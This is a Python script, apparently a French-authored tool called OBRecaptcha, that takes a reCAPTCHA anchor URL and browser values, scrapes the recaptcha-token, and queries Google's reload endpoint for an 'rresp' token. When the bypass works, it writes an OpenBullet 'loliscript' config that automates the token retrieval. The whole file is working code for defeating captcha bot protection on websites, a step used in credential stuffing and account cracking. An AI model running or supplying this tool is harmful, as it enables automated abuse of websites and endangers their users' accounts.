import os
import requests
from colorama import Fore
from urllib import parse
from bs4 import BeautifulSoup

def logo():
    os.system("cls")
    print(Fore.CYAN +"    ███████    ███████████  ███████████                                          █████             █████               ")
    print(Fore.CYAN +"  ███░░░░░███ ░░███░░░░░███░░███░░░░░███                                        ░░███             ░░███                ")
    print(Fore.CYAN +" ███     ░░███ ░███    ░███ ░███    ░███   ██████   ██████   ██████   ████████  ███████    ██████  ░███████    ██████  ")
    print(Fore.CYAN +"░███      ░███ ░██████████  ░██████████   ███░░███ ███░░███ ░░░░░███ ░░███░░███░░░███░    ███░░███ ░███░░███  ░░░░░███ ")
    print(Fore.CYAN +"░███      ░███ ░███░░░░░███ ░███░░░░░███ ░███████ ░███ ░░░   ███████  ░███ ░███  ░███    ░███ ░░░  ░███ ░███   ███████ ")
    print(Fore.CYAN +"░░███     ███  ░███    ░███ ░███    ░███ ░███░░░  ░███  ███ ███░░███  ░███ ░███  ░███ ███░███  ███ ░███ ░███  ███░░███ ")
    print(Fore.CYAN +" ░░░███████░   ███████████  █████   █████░░██████ ░░██████ ░░████████ ░███████   ░░█████ ░░██████  ████ █████░░████████")
    print(Fore.CYAN +"   ░░░░░░░    ░░░░░░░░░░░  ░░░░░   ░░░░░  ░░░░░░   ░░░░░░   ░░░░░░░░  ░███░░░     ░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░░░ ")
    print(Fore.CYAN +"                                                                      ░███                                             ")
    print(Fore.CYAN +"                    Crée par Ell10T_4lD3rS0n                          █████                                            ")
    print(Fore.CYAN +"                           Dev with ♥                                ░░░░░                                             \n\n" + Fore.RESET)

logo()

#         Input         #

url_anchor = input("Entre l'URL anchor ► ")
var_chr = input("CHR [xx,xx,xx] : ")
var_vh = input("VH : ")
var_bg = input("BG !x* : ")

logo()

#         Variables         #

var_k = parse.parse_qs(parse.urlparse(url_anchor).query)['k'][0]
var_co = parse.parse_qs(parse.urlparse(url_anchor).query)['co'][0]
var_v = parse.parse_qs(parse.urlparse(url_anchor).query)['v'][0]
var_hl = parse.parse_qs(parse.urlparse(url_anchor).query)['hl'][0]
var_size = "invisible"

#         Get recaptcha-token         #

get_tkn = requests.get(url_anchor)
soup = BeautifulSoup(get_tkn.text,"html.parser")
var_c = soup.find(id="recaptcha-token")['value']

#        Get rresp          #

url_reload = f"https://www.google.com/recaptcha/api2/reload?k={var_k}"
payload = f"v={var_v}&reason=q&c={var_c}&k={var_k}&co={var_co}&hl={var_hl}&size=invisible&chr={var_chr}&vh={var_vh}&bg={var_bg}"
headers = {'Host': 'www.google.com', 'Content-Type': 'application/x-www-form-urlencoded'}
post_rresp = requests.post(url_reload, data=payload, headers=headers)

#         Check rresp         #

if "\"rresp\",\"" in post_rresp.text:
    print(Fore.GREEN + "Bypass Recaptcha Possible" + Fore.RESET)
    post_data = f"v={var_v}&reason=q&c=<recaptcha-token>&k={var_k}&co={var_co}&hl={var_hl}&size=invisible&chr={var_chr}&vh={var_vh}&bg={var_bg}"
    loliscript = f"#GET_recaptcha-token REQUEST GET \"{str(url_anchor)}\"\n\n#recaptcha-token PARSE \"<SOURCE>\" LR \"<input type=\\\"hidden\\\" id=\\\"recaptcha-token\\\" value=\\\"\" \"\\\">\" -> VAR \"recaptcha-token\" \n\n#POST_GET_rresp REQUEST POST \"{str(url_reload)}\" AutoRedirect=FALSE \n  CONTENT \"{str(post_data)}\" \n  CONTENTTYPE \"application/x-www-form-urlencoded\" \n\n#rresp PARSE \"<SOURCE>\" LR \"[\\\"rresp\\\",\\\"\" \"\\\",\" -> VAR \"rresp\" "
    with open("loliscript.txt", "w") as f:
        f.writelines(loliscript)
        f.close()
else:
    print(Fore.RED + "Bypass Recaptcha Impossible" + Fore.RESET)